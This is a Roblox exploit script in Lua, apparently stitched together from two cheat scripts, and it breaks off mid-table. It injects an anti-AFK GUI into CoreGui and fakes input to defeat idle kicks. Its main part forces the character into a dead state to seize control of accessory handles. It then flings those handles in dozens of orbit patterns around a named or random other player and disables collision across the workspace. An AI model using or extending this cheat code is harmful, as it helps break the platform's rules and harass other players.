wait(0.5)local ba=Instance.new("ScreenGui")
local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
local _b=Instance.new("TextLabel")local ab=Instance.new("TextLabel")ba.Parent=game.CoreGui
ba.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;ca.Parent=ba;ca.Active=true
ca.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ca.Draggable=true
ca.Position=UDim2.new(0.698610067,0,0.098096624,0)ca.Size=UDim2.new(0,370,0,52)
ca.Font=Enum.Font.SourceSansSemibold;ca.Text="Anti Afk"ca.TextColor3=Color3.new(0,1,1)
ca.TextSize=22;da.Parent=ca
da.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)da.Position=UDim2.new(0,0,1.0192306,0)
da.Size=UDim2.new(0,370,0,107)_b.Parent=da
_b.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)_b.Position=UDim2.new(0,0,0.800455689,0)
_b.Size=UDim2.new(0,370,0,21)_b.Font=Enum.Font.Arial;_b.Text="Made by luca#5432"
_b.TextColor3=Color3.new(0,1,1)_b.TextSize=20;ab.Parent=da
ab.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ab.Position=UDim2.new(0,0,0.158377,0)
ab.Size=UDim2.new(0,370,0,44)ab.Font=Enum.Font.ArialBold;ab.Text="Status: Active"
ab.TextColor3=Color3.new(0,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
bb:CaptureController()bb:ClickButton2(Vector2.new())
ab.Text="Roblox tried kicking you buy I didnt let them!"wait(2)ab.Text="Status : Active"end)
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:FindFirstChildOfClass("PlayerGui")

-- Create the ScreenGui
local gui = Instance.new("ScreenGui")
gui.Parent = playerGui
gui.ResetOnSpawn = false

-- Create the Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 180)
frame.Position = UDim2.new(0.5, -125, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
frame.BorderSizePixel = 2
frame.Parent = gui
frame.Active = true
frame.Draggable = true

-- Minimize Button
local minimize = Instance.new("TextButton")
minimize.Size = UDim2.new(0, 25, 0, 25)
minimize.Position = UDim2.new(1, -55, 0, 0)
minimize.Text = "-"
minimize.Parent = frame

-- Close Button
local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 25, 0, 25)
close.Position = UDim2.new(1, -30, 0, 0)
close.Text = "X"
close.TextColor3 = Color3.fromRGB(255, 0, 0)
close.Parent = frame
close.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

-- Button to Execute Code
local executeButton = Instance.new("TextButton")
executeButton.Size = UDim2.new(0, 220, 0, 60)
executeButton.Position = UDim2.new(0, 15, 0, 60)
executeButton.Text = "Execute Code"
executeButton.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
executeButton.Parent = frame
executeButton.MouseButton1Click:Connect(function()
local p=game:GetService("Players")
local rs=game:GetService("RunService")
local st=game:GetService("Stats")
local lp=p.LocalPlayer

local acc={}
local sp=2 -- Speed
local r=6  -- Range/Offset
local oh=3  -- Offset Height (may not be used by all modes)
local oc=nil -- Orbit Connection
local owner="BloxiAstra"
local pre="."
local ot=nil -- Orbit Target Player
local maxAcc=10
local respActive=false
local curMode=nil
local lastVel={}

-- New variables from script 2, adapted to script 1's style
local height = oh -- Using script 1's oh as default height, can be adjusted
local offset = r  -- Using script 1's r as default offset/range, can be adjusted
local speed = sp  -- Using script 1's sp as default speed, can be adjusted

local function disableColl()
	for _,p in ipairs(workspace:GetDescendants()) do
		if p:IsA("BasePart") then
			p.CanCollide=false
			p.CanTouch=false
			p.CanQuery=false
		end
	end
	workspace.DescendantAdded:Connect(function(p)
		if p:IsA("BasePart") then
			p.CanCollide=false
			p.CanTouch=false
			p.CanQuery=false
		end
	end)
end

local function enableColl()
	for _,p in ipairs(workspace:GetDescendants()) do
		if p:IsA("BasePart") then
			p.CanCollide=true
			p.CanTouch=true
			p.CanQuery=true
		end
	end
end

local function getAcc()
	acc={}
	if not lp.Character then return end
	local cnt=0
	for _,a in ipairs(lp.Character:GetChildren()) do
		if a:IsA("Accessory") and cnt<maxAcc then
			local h=a:FindFirstChild("Handle")
			if h then table.insert(acc,h); cnt=cnt+1 end
		end
	end
end

local function getTarg(t,s)
	if t=="me" then return s
	elseif t=="random" then
		local ps=p:GetPlayers() if #ps>1 then
            local validPlayers = {}
            for _, player in ipairs(p:GetPlayers()) do
                if player ~= lp then
                    table.insert(validPlayers, player)
                end
            end
            if #validPlayers > 0 then
                return validPlayers[math.random(1, #validPlayers)]
            end
        end
	else
		for _,pl in ipairs(p:GetPlayers()) do
			if pl.Name:lower():find(t:lower()) or pl.DisplayName:lower():find(t:lower()) then return pl end
		end
	end
	return nil
end

local function getPing()
	return st.Network.ServerStatsItem["Data Ping"]:GetValue()/1000
end

local function enhancedPredPos(rp,ping)
	local t=tick()
	local vel=rp.Velocity
	local prev=lastVel[rp]
	local accVec=Vector3.new(0,0,0)
	if prev then local dt=t-prev.t if dt>0 then accVec=(vel-prev.v)/dt end end
	lastVel[rp]={v=vel,t=t}
	local predTime=ping+0.1
	local basePred=rp.Position+vel*predTime+0.5*accVec*(predTime^2)
	local lead=math.min(math.max(ping*10,1),5)
	return (vel.Magnitude>0) and (basePred+vel.Unit*lead) or basePred
end

local function respLoop()
	while respActive do
		if lp.Character and lp.Character:FindFirstChild("Humanoid") then
			lp.Character.Humanoid:ChangeState(15)
		end
		wait(1) getAcc()
	end
end

local function stopOrbit()
	if oc then oc:Disconnect() oc=nil end
	respActive=false
	ot=nil; curMode=nil
	enableColl()
	for _,h in ipairs(acc) do if h and h.Parent then h.CFrame=CFrame.new(h.Position) end end
end

local function computeOffset(hr, off)
	return (hr.CFrame * CFrame.new(off)).p - hr.CFrame.p
end

-- Script 1 Modes (Replicated for completeness, already in original script)
local function orbitDef() -- h
	if not ot or not ot.Character then return end
	local hr=ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	oc=rs.Heartbeat:Connect(function()
		local base=tick()*sp
		local ping=getPing()
		local pred=hr.Position
		local n=#acc
		for i,h in ipairs(acc) do
			local ang=base+(i*(2*math.pi/n))
			local off=Vector3.new(math.cos(ang)*r,0,math.sin(ang)*r)
			local offWorld=computeOffset(hr, off)
			h.CFrame=CFrame.new(pred+offWorld)
		end
	end)
	disableColl() curMode="h"
end

local function orbitWave() -- w
	if not ot or not ot.Character then return end
	local hr=ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	oc=rs.Heartbeat:Connect(function()
		local base=tick()*sp
		local ping=getPing()
		local pred=hr.Position
		local n=#acc
		for i,h in ipairs(acc) do
			local ang=base+(i*(2*math.pi/n))
			local off=Vector3.new(math.cos(ang)*r, math.sin(base*2+i), math.sin(ang)*r)
			local offWorld=computeOffset(hr, off)
			h.CFrame=CFrame.new(pred+offWorld)
		end
	end)
	disableColl() curMode="w"
end

local function orbit8() -- 8 (Removed)
end

local function orbitSpiral() -- sp
	if not ot or not ot.Character then return end
	local hr=ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	local tight=0.5;
	oc=rs.Heartbeat:Connect(function()
		local base=tick()*sp
		local ping=getPing()
		local pred=hr.Position
		local n=#acc
		for i,h in ipairs(acc) do
			local ang=base+(i*(2*math.pi/n))
			local rad=r+(i*tight)
			local off=Vector3.new(math.cos(ang)*rad, 0, math.sin(ang)*rad)
			local offWorld=computeOffset(hr, off)
			h.CFrame=CFrame.new(pred+offWorld)
		end
	end)
	disableColl() curMode="sp"
end

local function orbitDyn3() -- dy3
	if not ot or not ot.Character then return end
	local hr=ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	oc=rs.Heartbeat:Connect(function()
		local ping=getPing()
		local pred=hr.Position
		local n=#acc; local tme=tick()*sp
		for i,h in ipairs(acc) do
			local a=tme+(i*(2*math.pi/n))
			local mod=math.sin(tme+i*0.3)+math.cos(tme*0.5+i*0.7)
			local dR=r*(1+0.3*mod)
			local off=Vector3.new(math.cos(a)*dR, math.sin(tme*2+i)*1.5*(1+0.2*mod), math.sin(a)*dR)
			local offWorld=computeOffset(hr, off)
			h.CFrame=CFrame.new(pred+offWorld)
		end
	end)
	disableColl() curMode="dy3"
end

local function orbitSwirl() -- swr
	if not ot or not ot.Character then return end
	local hr=ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	oc=rs.Heartbeat:Connect(function()
		local ping=getPing()
		local pred=hr.Position
		local n=#acc; local tme=tick()*sp
		for i,h in ipairs(acc) do
			local a=tme+(i*(2*math.pi/n))
			local swirl=math.sin(tme*1.5+i)*0.7
			local dR=r*(1+swirl)
			local off=Vector3.new(math.cos(a)*dR, math.cos(tme+i)*1.2, math.sin(a)*dR)
			local offWorld=computeOffset(hr, off)
			h.CFrame=CFrame.new(pred+offWorld)
		end
	end)
	disableColl() curMode="swr"
end

local function orbitInf() -- in
	if not ot or not ot.Character then return end
	local hr=ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	local tilt=math.rad(20)
	oc=rs.Heartbeat:Connect(function()
		local ping=getPing()
		local pred=hr.Position
		local base=tick()*sp
		local n=#acc
		for i,h in ipairs(acc) do
			local off=Vector3.new(r*math.cos(base+(i*(2*math.pi/n))), 0, r*math.sin(2*(base+(i*(2*math.pi/n))))*0.8)
			local offWorld=computeOffset(hr, off)
			local tc=CFrame.new(pred+offWorld) * CFrame.Angles(tilt,0,0)
			local offNext=Vector3.new(r*math.cos(base+((i+1)*(2*math.pi/n))), 0, r*math.sin(2*(base+((i+1)*(2*math.pi/n)))*0.8))
			local offNextWorld=computeOffset(hr, offNext)
			h.CFrame=CFrame.new(tc.Position, pred+offNextWorld)
		end
	end)
	disableColl() curMode="in"
end

local function orbitSin() -- sw
	if not ot or not ot.Character then return end
	local hr=ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	local waveAmp=r; local waveFreq=0.8; local waveSpd=1.5; local phase=1
	oc=rs.Heartbeat:Connect(function()
		local ping=getPing()
		local pred=hr.Position
		local tme=tick()*waveSpd
		local n=#acc
		for i,h in ipairs(acc) do
			local off=Vector3.new(math.cos(tme+(i*phase)*waveFreq)*waveAmp, math.sin(tme+(i*phase)*waveFreq)*waveAmp, 0)
			local offWorld=computeOffset(hr, off)
			h.CFrame=CFrame.new(pred+offWorld)
		end
	end)
	disableColl() curMode="sw"
end

local function orbitStar() -- hx
	if not ot or not ot.Character then return end
	local hr=ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	local inner=r*0.5; local outer=r; local tilt=math.rad(45)
	oc=rs.Heartbeat:Connect(function()
		local base=tick()*sp
		local ping=getPing()
		local pred=hr.Position
		local n=#acc
		for i,h in ipairs(acc) do
			local curR = (i % 2 == 0) and inner or outer
			local ang = base + (i * (2 * math.pi / n))
			local off = Vector3.new(math.cos(ang)*curR, 0, math.sin(ang)*curR)
			local offWorld = computeOffset(hr, off)
			local cf = (i % 2 == 0) and CFrame.new(pred+offWorld) * (CFrame.Angles(0, ang, 0)) or CFrame.new(pred+offWorld) * (CFrame.Angles(tilt, ang, 0))
			local nextAng = base + ((i+1) * (2 * math.pi / n))
			local offNext = Vector3.new(math.cos(nextAng)*curR, 0, math.sin(nextAng)*curR)
			local offNextWorld = computeOffset(hr, offNext)
			h.CFrame=CFrame.new(cf.Position, pred+offNextWorld)
		end
	end)
	disableColl() curMode="hx"
end

local function orbitFlower() -- f
	if not ot or not ot.Character then return end
	local hr=ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	local petalH=5; local petalDip=-2; local openSpd=1
	oc=rs.Heartbeat:Connect(function()
		local ping=getPing()
		local pred=hr.Position
		local openAng=math.sin(tick()*openSpd)*math.rad(45)
		local n=#acc
		local petalR=4+math.sin(tick()*0.5)*0.5
		local offWorld
		for i,h in ipairs(acc) do
			local ang=i*(2*math.pi/n)
			local off=Vector3.new(math.cos(ang)*petalR, petalH+math.sin(ang+tick()*openSpd)*petalDip, math.sin(ang)*petalR)
			offWorld = computeOffset(hr, off)
			h.CFrame = CFrame.new(pred+offWorld) * CFrame.Angles(openAng,0,0)
		end
	end)
	disableColl() curMode="f"
end

local function orbitWeave() -- we
	if not ot or not ot.Character then return end
	local hr=ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	local weaveR=r; local weaveH=2; local weaveSpd=1.5; local weaveDen=2
	oc=rs.Heartbeat:Connect(function()
		local ping=getPing()
		local pred=hr.Position
		local tme=tick()*weaveSpd
		local n=#acc
		for i,h in ipairs(acc) do
			local off=Vector3.new(math.cos((i/n)*2*math.pi*weaveDen+tme)*weaveR, math.sin((i/n)*2*math.pi*weaveDen+tme*2)*weaveH, math.sin((i/n)*2*math.pi*weaveDen+tme)*weaveR)
			local offWorld = computeOffset(hr, off)
			h.CFrame = CFrame.new(pred+offWorld)
		end
	end)
	disableColl() curMode="we"
end

local function orbitHeart() -- heart
	if not ot or not ot.Character then return end
	local hr=ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	local scale = r * 0.8
	local offsetY = 4
	local fixedZ = 2
	oc=rs.Heartbeat:Connect(function()
		local ping=getPing()
		local pred=hr.Position
		local n=#acc
		for i,h in ipairs(acc) do
			local tParam = (i/(n+1))*2*math.pi
			local x = scale * math.sin(tParam)^3
			local y = scale*(13*math.cos(tParam)-5*math.cos(2*tParam)-2*math.cos(3*tParam)-math.cos(4*tParam))/16
			local off = Vector3.new(x, y+offsetY, fixedZ)
			local offWorld = computeOffset(hr, off)
			h.CFrame = CFrame.new(pred+offWorld)
		end
	end)
	disableColl() curMode="heart"
end

local function orbitWings() -- wings (Original)
	if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	oc=rs.Heartbeat:Connect(function()
		local ping = getPing()
		local pred = hr.Position
		local wingSpan = r * 1.8
		local wingLift = 2
		local flapAmp = 1.5
		local flapSpeed = 2
		local leftWing = {}
		local rightWing = {}
		for i, h in ipairs(acc) do
			if i % 2 == 1 then table.insert(leftWing, h) else table.insert(rightWing, h) end
		end
		local nL = #leftWing
		for i, h in ipairs(leftWing) do
			local tVal = i/(nL+1)
			local basePos = Vector3.new(-wingSpan*tVal, -wingLift*tVal, 0)
			local flap = math.sin(tick()*flapSpeed + i)*flapAmp
			local pos = basePos + Vector3.new(0, flap, 0)
			local posWorld = computeOffset(hr, pos)
			h.CFrame = CFrame.new(pred+posWorld, pred)
		end
		local nR = #rightWing
		for i, h in ipairs(rightWing) do
			local tVal = i/(nR+1)
			local basePos = Vector3.new(wingSpan*tVal, -wingLift*tVal, 0)
			local flap = math.sin(tick()*flapSpeed + i+math.pi)*flapAmp
			local pos = basePos + Vector3.new(0, flap, 0)
			local posWorld = computeOffset(hr, pos)
			h.CFrame = CFrame.new(pred+posWorld, pred)
		end
	end)
	disableColl() curMode = "wings"
end

local function orbitDragon() -- dragon
	if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	oc = rs.Heartbeat:Connect(function()
		local base = tick()*sp
		local ping = getPing()
		local pred = hr.Position
		local n = #acc
		for i, h in ipairs(acc) do
			local tParam = base + (i*(2*math.pi/n))
			local x = r*math.cos(tParam) + math.sin(tick()+i)*2
			local z = r*math.sin(tParam) + math.cos(tick()+i)*2
			local y = math.sin(tick()*2+i)*2
			local off = Vector3.new(x, y, z)
			local offWorld = computeOffset(hr, off)
			h.CFrame = CFrame.new(pred+offWorld)
		end
	end)
	disableColl() curMode = "dragon"
end


-- Script 2 Modes adapted to Script 1

local function orbitMode2() -- mode2
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	local angleIncrement = math.pi * 2 / #acc

	oc = rs.Heartbeat:Connect(function()
		local baseAngle = speed * tick()
		local ping = getPing()
		local pred = hr.Position
		local rootOrientation = hr.CFrame - hr.CFrame.Position -- Rotation only

		for i, hat in ipairs(acc) do
			local hatRotation = baseAngle + angleIncrement * (i - 1)
			local x = math.sin(hatRotation) * offset
			local z = math.cos(hatRotation) * offset
			local off = rootOrientation * Vector3.new(x, -height, z) -- Adjusted Y and Z for script 1 style
			local offWorld = computeOffset(hr, off)
			hat.CFrame = CFrame.new(pred+offWorld)
		end
	end)
	disableColl() curMode = "mode2"
end


local function orbitMode3() -- mode3
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    local waitTime = 0.15
    local currentIndex = 1

    oc = rs.Heartbeat:Connect(function()
        if currentIndex <= #acc then
            local hat = acc[currentIndex]
            local ping = getPing()
            local pred = hr.Position
            local off = Vector3.new(0, height, 0)
            local offWorld = computeOffset(hr, off)
            hat.CFrame = CFrame.new(pred+offWorld)
            currentIndex = currentIndex + 1
        else
            currentIndex = 1 -- Reset to loop again if needed, or stop after one cycle
            if curMode ~= "mode3" then -- Stop if mode changed
                stopOrbit()
            end
        end
        wait(waitTime) -- Delay within heartbeat is generally not recommended, better to control speed with sp
    end)
    disableColl() curMode = "mode3"
end


local function orbitMode4() -- mode4
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart") -- hr is technically not used, but kept for consistency
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    local mouse = lp:GetMouse()

    oc = rs.Heartbeat:Connect(function()
        local targetPos = mouse.Hit.Position
        local ping = getPing()
        local pred = targetPos -- No need to predict mouse, just use current position
        for _, hat in ipairs(acc) do
            hat.CFrame = CFrame.new(pred) -- Directly to mouse hit position, no orbit
        end
        if curMode ~= "mode4" then
            stopOrbit()
        end
    end)
    disableColl() curMode = "mode4"
end


local function orbitMode5() -- mode5
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    local spiralPitch = 0
	local spiralAngle = 0

    oc = rs.Heartbeat:Connect(function()
        spiralAngle = spiralAngle + speed / 300
        if spiralAngle >= math.pi * 10 then
            spiralAngle = 0
        end
        local ping = getPing()
        local pred = hr.Position

        for i, hat in ipairs(acc) do
            local x = math.sin(spiralAngle + i * spiralPitch) * (i * offset / 8)
            local y = i * (height / 3)
            local z = math.cos(spiralAngle + i * spiralPitch) * (i * offset / 8)
            local off = Vector3.new(x, y, z)
            local offWorld = computeOffset(hr, off)
            hat.CFrame = CFrame.new(pred+offWorld)
        end
        spiralPitch += speed / 70
        if curMode ~= "mode5" then
            stopOrbit()
        end
    end)
    disableColl() curMode = "mode5"
end


local function orbitMode6() -- mode6
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    local stack1 = {}
	local stack2 = {}

	for i = 1, #acc do
		if i <= #acc / 2 then
			stack1[#stack1 + 1] = acc[i]
		else
			stack2[#stack2 + 1] = acc[i]
		end
	end

    oc = rs.Heartbeat:Connect(function()
        local angle = tick() * speed
        local x = math.sin(angle) * offset
        local z = math.cos(angle) * offset
        local ping = getPing()
        local pred = hr.Position

        for i, v in ipairs(stack1) do
            local off = Vector3.new(x, i + height, -z)
            local offWorld = computeOffset(hr, off)
            v.CFrame = CFrame.new(pred+offWorld)
        end

        for i, v in ipairs(stack2) do
            local off = Vector3.new(-x, i + height, z)
            local offWorld = computeOffset(hr, off)
            v.CFrame = CFrame.new(pred+offWorld)
        end
        if curMode ~= "mode6" then
            stopOrbit()
        end
    end)
    disableColl() curMode = "mode6"
end


local function orbitMode7() -- mode7
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    local stack1 = {}
	local stack2 = {}
	local stack3 = {}

	for i = 1, #acc do
		if i < #acc / 3 then
			stack1[#stack1 + 1] = acc[i]
		elseif i < #acc / 3 * 2 then -- Corrected condition
			stack2[#stack2 + 1] = acc[i]
		else
			stack3[#stack3 + 1] = acc[i]
		end
	end

    oc = rs.Heartbeat:Connect(function()
        local angle = tick() * speed
        local x = math.sin(angle) * offset
        local z = math.cos(angle) * offset
        local ping = getPing()
        local pred = hr.Position

        for i, v in ipairs(stack1) do
            local off = Vector3.new(x, i + height, -z)
            local offWorld = computeOffset(hr, off)
            v.CFrame = CFrame.new(pred+offWorld)
        end

        for i, v in ipairs(stack2) do
            local off = Vector3.new(x, i + height, z)
            local offWorld = computeOffset(hr, off)
            v.CFrame = CFrame.new(pred+offWorld)
        end

        for i, v in ipairs(stack3) do
            local off = Vector3.new(-x, i + height, -z)
            local offWorld = computeOffset(hr, off)
            v.CFrame = CFrame.new(pred+offWorld)
        end
        if curMode ~= "mode7" then
            stopOrbit()
        end
    end)
    disableColl() curMode = "mode7"
end


local function orbitModeHexagon() -- modeHexagon (New)
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	oc=rs.Heartbeat:Connect(function()
		local base = tick() * speed
		local ping = getPing()
		local pred = hr.Position
		local n = #acc
		for i, h in ipairs(acc) do
			local angle = base + (i * (2 * math.pi / n))
			local offX = r * math.cos(angle)
			local offZ = r * math.sin(angle)
			local offY = 0

			if n >= 6 then -- Distribute in hexagon if enough accessories
				local hexagonPoints = 6
				local hexagonAngleStep = 2 * math.pi / hexagonPoints
				local hexagonIndex = (i - 1) % hexagonPoints
				local hexagonAngle = hexagonIndex * hexagonAngleStep
				offX = r * math.cos(hexagonAngle + base)
				offZ = r * math.sin(hexagonAngle + base)
			end

			local off = Vector3.new(offX, offY, offZ)
			local offWorld = computeOffset(hr, off)
			h.CFrame = CFrame.new(pred+offWorld)
		end
	end)
	disableColl() curMode = "hexagon"
end

local function orbitModeSnake() -- modeSnake (New)
	if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	local snakeLength = #acc
	local snakeSpacing = offset / snakeLength
	oc = rs.Heartbeat:Connect(function()
		local ping = getPing()
		local pred = hr.Position
		local lookVector = hr.CFrame.LookVector
		for i, hat in ipairs(acc) do
			local posOffset = lookVector * snakeSpacing * (i - 1)
			local offWorldPos = (hr.CFrame * CFrame.new(-posOffset)).p - hr.CFrame.p
			hat.CFrame = CFrame.new(pred+offWorldPos)
		end
	end)
	disableColl() curMode = "snake"
end


local function orbitWingsV2() -- modeWingsV2 (New - Animated Flap, Back Attach)
	if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
	oc=rs.Heartbeat:Connect(function()
		local ping = getPing()
		local pred = hr.Position
		local wingSpan = r * 1.8
		local wingLift = 2
		local flapAmp = math.rad(30) -- Flap amplitude in radians
		local flapSpeed = 2
		local leftWing = {}
		local rightWing = {}
		for i, h in ipairs(acc) do
			if i % 2 == 1 then table.insert(leftWing, h) else table.insert(rightWing, h) end
		end

		local function updateWings(wings, sideMultiplier, speedMultiplier, ampMultiplier)
			local nWing = #wings
			for i, h in ipairs(wings) do
				local tVal = i/(nWing+1)
				local basePos = Vector3.new(wingSpan*tVal * sideMultiplier, -wingLift*tVal, 0)
				local flapAngle = math.sin(tick()*flapSpeed * speedMultiplier + i) * flapAmp * ampMultiplier * sideMultiplier
				local targetCFrame = hr.CFrame
					* CFrame.Angles(0, math.pi, 0) -- Face backward
					* CFrame.Angles(0, 0, flapAngle) -- Flap rotation
					* CFrame.new(basePos)

				local offWorldPos = targetCFrame.p - hr.CFrame.p -- Get world offset
				h.CFrame = CFrame.new(pred+offWorldPos)
			end
		end

		updateWings(leftWing, -1, 1, 1) -- Left wing, normal flap
		updateWings(rightWing, 1, 1, 1)  -- Right wing, normal flap

	end)
	disableColl() curMode = "wingsv2"
end

local function orbitWingsV3() -- modeWingsV3 (Fast Flap)
	if curMode~="wingsv2" then orbitWingsV2() end -- use v2 base and just change flap speed
	oc:Disconnect()
	oc=rs.Heartbeat:Connect(function()
		local ping = getPing()
		local pred = ot.Character.HumanoidRootPart.Position
		local wingSpan = r * 1.8
		local wingLift = 2
		local flapAmp = math.rad(20) -- Reduced amplitude for faster flap
		local flapSpeed = 4 -- Increased speed
		local leftWing = {}
		local rightWing = {}
		for i, h in ipairs(acc) do
			if i % 2 == 1 then table.insert(leftWing, h) else table.insert(rightWing, h) end
		end

		local function updateWings(wings, sideMultiplier, speedMultiplier, ampMultiplier)
			local nWing = #wings
			for i, h in ipairs(wings) do
				local tVal = i/(nWing+1)
				local basePos = Vector3.new(wingSpan*tVal * sideMultiplier, -wingLift*tVal, 0)
				local flapAngle = math.sin(tick()*flapSpeed * speedMultiplier + i) * flapAmp * ampMultiplier * sideMultiplier
				local targetCFrame = ot.Character.HumanoidRootPart.CFrame
					* CFrame.Angles(0, math.pi, 0) -- Face backward
					* CFrame.Angles(0, 0, flapAngle) -- Flap rotation
					* CFrame.new(basePos)

				local offWorldPos = targetCFrame.p - ot.Character.HumanoidRootPart.CFrame.p -- Get world offset
				h.CFrame = CFrame.new(pred+offWorldPos)
			end
		end

		updateWings(leftWing, -1, 1, 1) -- Left wing
		updateWings(rightWing, 1, 1, 1)  -- Right wing

	end)
	disableColl() curMode = "wingsv3"
end

function orbitWingsV4() -- modeWingsV4 (Slow big flap)
	if curMode~="wingsv2" then orbitWingsV2() end -- use v2 base and just change flap speed
	oc:Disconnect()
	oc=rs.Heartbeat:Connect(function()
		local ping = getPing()
		local pred = ot.Character.HumanoidRootPart.Position
		local wingSpan = r * 2.2 -- bigger wings
		local wingLift = 3
		local flapAmp = math.rad(60) -- bigger amplitude
		local flapSpeed = 0.7 -- slower speed
		local leftWing = {}
		local rightWing = {}
		for i, h in ipairs(acc) do
			if i % 2 == 1 then table.insert(leftWing, h) else table.insert(rightWing, h) end
		end

		local function updateWings(wings, sideMultiplier, speedMultiplier, ampMultiplier)
			local nWing = #wings
			for i, h in ipairs(wings) do
				local tVal = i/(nWing+1)
				local basePos = Vector3.new(wingSpan*tVal * sideMultiplier, -wingLift*tVal, 0)
				local flapAngle = math.sin(tick()*flapSpeed * speedMultiplier + i) * flapAmp * ampMultiplier * sideMultiplier
				local targetCFrame = ot.Character.HumanoidRootPart.CFrame
					* CFrame.Angles(0, math.pi, 0) -- Face backward
					* CFrame.Angles(0, 0, flapAngle) -- Flap rotation
					* CFrame.new(basePos)

				local offWorldPos = targetCFrame.p - ot.Character.HumanoidRootPart.CFrame.p -- Get world offset
				h.CFrame = CFrame.new(pred+offWorldPos)
			end
		end

		updateWings(leftWing, -1, 1, 1) -- Left wing
		updateWings(rightWing, 1, 1, 1)  -- Right wing

	end)
	disableColl() curMode = "wingsv4"
end

function orbitWingsV5() -- modeWingsV5 (Wave Flap)
	if curMode~="wingsv2" then orbitWingsV2() end -- use v2 base and just change flap speed
	oc:Disconnect()
	oc=rs.Heartbeat:Connect(function()
		local ping = getPing()
		local pred = ot.Character.HumanoidRootPart.Position
		local wingSpan = r * 1.8
		local wingLift = 2
		local flapAmp = math.rad(45)
		local flapSpeed = 2.5
		local leftWing = {}
		local rightWing = {}
		for i, h in ipairs(acc) do
			if i % 2 == 1 then table.insert(leftWing, h) else table.insert(rightWing, h) end
		end

		local function updateWings(wings, sideMultiplier, speedMultiplier, ampMultiplier)
			local nWing = #wings
			for i, h in ipairs(wings) do
				local tVal = i/(nWing+1)
				local basePos = Vector3.new(-wingSpan*tVal * sideMultiplier, -wingLift*tVal, 0)
				local flapAngle = math.sin(tick()*flapSpeed * speedMultiplier + i*0.5) * flapAmp * ampMultiplier * sideMultiplier -- wave in flap
				local targetCFrame = ot.Character.HumanoidRootPart.CFrame
					* CFrame.Angles(0, math.pi, 0) -- Face backward
					* CFrame.Angles(0, 0, flapAngle) -- Flap rotation
					* CFrame.new(basePos)

				local offWorldPos = targetCFrame.p - ot.Character.HumanoidRootPart.CFrame.p -- Get world offset
				h.CFrame = CFrame.new(pred+offWorldPos)
			end
		end

		updateWings(leftWing, -1, 1, 1) -- Left wing
		updateWings(rightWing, 1, 1, 1)  -- Right wing

	end)
	disableColl() curMode = "wingsv5"
end
local function orbitBodyPartCopy() -- modeCopy (New - Body Part Copy - FIXED - Match Target LookVector)
    if not ot or not ot.Character then return end
    local hr = ot.Character:FindFirstChild("HumanoidRootPart")
    if not hr then return end
    respActive=true; coroutine.wrap(respLoop)()

    local bodyPartsConfig = {
        [1] = {offset = Vector3.new(0, 0, 0), r15part = "Head", r6part = "Head"},
        [2] = {offset = Vector3.new(0, 0, 0), r15part = "UpperTorso", r6part = "Torso"},
        [3] = {offset = Vector3.new(0, 0, 0), r15part = "LeftHand", r6part = "Left Arm"},
